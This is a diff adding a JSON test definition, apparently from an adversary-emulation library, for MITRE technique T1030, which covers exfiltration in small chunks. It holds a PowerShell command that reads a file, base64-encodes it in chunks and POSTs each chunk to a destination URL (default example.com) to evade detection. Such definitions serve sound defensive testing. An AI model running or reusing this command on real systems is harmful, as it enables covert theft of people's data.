@@ -1,0 +1,40 @@
+{
+    "name": "Network-Based Data Transfer in Small Chunks",
+    "description": "Simulate transferring data over a network in small chunks to evade detection.",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()\n",
+        "type": "Command Executor"
+    },
+    "id": "T1030",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Data Transfer Size Limits",
+    "source": "ART",
+    "uuid": "f0287b58-f4bc-40f6-87eb-692e126e7f8f",
+    "arguments": {
+        "source_file_path": {
+            "description": "Path to the source file to transfer.",
+            "type": "path",
+            "default": "[User specified]"
+        },
+        "destination_url": {
+            "description": "URL of the destination server.",
+            "type": "url",
+            "default": "http://example.com"
+        },
+        "chunk_size": {
+            "description": "Size of each data chunk (in KB).",
+            "type": "integer",
+            "default": 1024
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
